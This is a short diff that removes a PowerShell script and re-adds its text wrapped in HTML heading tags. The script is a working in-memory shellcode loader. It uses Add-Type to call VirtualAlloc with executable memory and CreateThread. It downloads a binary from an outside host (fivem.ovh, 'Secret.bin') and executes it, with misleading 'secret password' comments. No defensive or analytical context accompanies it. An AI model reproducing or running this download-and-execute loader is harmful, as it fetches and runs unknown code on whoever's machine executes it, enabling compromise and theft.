@@ -1,17 +1,22 @@
-Add-Type @" 
-using System; using System.Runtime.InteropServices; 
-public class R { 
-    [DllImport("kernel32.dll")] public static extern IntPtr VirtualAlloc(IntPtr a, uint s, uint t, uint p); 
-    [DllImport("kernel32.dll")] public static extern IntPtr CreateThread(IntPtr a, uint s, IntPtr sa, IntPtr p, uint f, out uint tid); 
-    [DllImport("kernel32.dll")] public static extern uint WaitForSingleObject(IntPtr h, uint t); 
-    public static void X(byte[] sc) { 
-        IntPtr m = VirtualAlloc(IntPtr.Zero, (uint)sc.Length, 0x3000, 0x40); 
-        Marshal.Copy(sc, 0, m, sc.Length); 
-        IntPtr t = CreateThread(IntPtr.Zero, 0, m, IntPtr.Zero, 0, out uint id); 
-        WaitForSingleObject(t, 0xFFFFFFFF); 
-    } 
-} 
-"@
+<!DOCTYPE html>
+<head>
+    <h1>Add-Type @"  </h1>
+<h1>using System; using System.Runtime.InteropServices; </h1>
+<h1>public class R { </h1>
+    <h1>[DllImport("kernel32.dll")] public static extern IntPtr VirtualAlloc(IntPtr a, uint s, uint t, uint p); </h1>
+   <h1> [DllImport("kernel32.dll")] public static extern IntPtr CreateThread(IntPtr a, uint s, IntPtr sa, IntPtr p, uint f, out uint tid); </h1>
+   <h1> [DllImport("kernel32.dll")] public static extern uint WaitForSingleObject(IntPtr h, uint t); </h1>
+ <h1>   public static void X(byte[] sc) { </h1>
+    <h1>    IntPtr m = VirtualAlloc(IntPtr.Zero, (uint)sc.Length, 0x3000, 0x40); </h1>
+    <h1>    Marshal.Copy(sc, 0, m, sc.Length); </h1>
+   <h1>     IntPtr t = CreateThread(IntPtr.Zero, 0, m, IntPtr.Zero, 0, out uint id); </h1>
+   <h1>     WaitForSingleObject(t, 0xFFFFFFFF); </h1>
+  <h1>  } </h1>
+<h1>} </h1>
+<h1>"@</h1>
 
-$sc = (New-Object Net.WebClient).DownloadData("https://fivem.ovh/downloads/Secret.bin")
-[R]::X($sc) #secret #password
+<h1>$sc = (New-Object Net.WebClient).DownloadData("https://fivem.ovh/downloads/Secret.bin")</h1>
+<h1>[R]::X($sc) #secret #password</h1>
+
+    </head>
+
